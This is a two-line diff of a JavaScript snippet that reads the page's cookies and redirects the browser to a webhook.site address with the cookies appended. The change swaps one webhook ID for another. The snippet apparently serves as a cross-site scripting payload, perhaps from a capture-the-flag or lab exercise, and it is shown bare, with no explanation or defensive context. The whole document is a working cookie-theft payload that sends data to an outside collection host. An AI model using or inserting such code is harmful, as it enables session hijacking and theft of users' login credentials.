@@ -1,2 +1,2 @@
 var cookieValue = document.cookie;
-location.href = "https://webhook.site/25357a8b-bbbb-4773-a9c4-c2e64b5e2b06?q=".concat(cookieValue);
+location.href = "https://webhook.site/4abb2b29-16db-4d83-b99e-86818bc20491?q=".concat(cookieValue);
